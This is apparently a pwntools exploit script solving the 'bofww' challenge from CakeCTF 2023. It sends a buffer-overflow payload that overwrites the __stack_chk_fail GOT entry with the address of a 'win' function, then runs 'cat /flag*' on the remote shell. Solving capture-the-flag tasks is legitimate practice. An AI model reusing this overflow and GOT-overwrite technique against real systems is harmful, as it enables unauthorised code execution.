#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host bofww.2023.cakectf.com --port 9002 --path ./bofww
from pwn import *
import time

# Set up pwntools for the correct architecture
context.log_level = logging.DEBUG
#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
exe = './bofww'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'bofww.2023.cakectf.com'
port = int(args.PORT or 9002)

win = 0x4012f6
stack_fail_got = 0x404050

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b input_person
p/gx 4rsi
b *0x0040136e
#b *0x00401398
b win
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

b = p64(win) + (b'A' * 0x128) + p64(stack_fail_got) + p64(0) + p64(8) + p64(0)
io.sendlineafter('name? ', b)
io.sendlineafter('you? ', b'0')

io.sendline('cat /flag*')
info(io.recvline())
io.close()
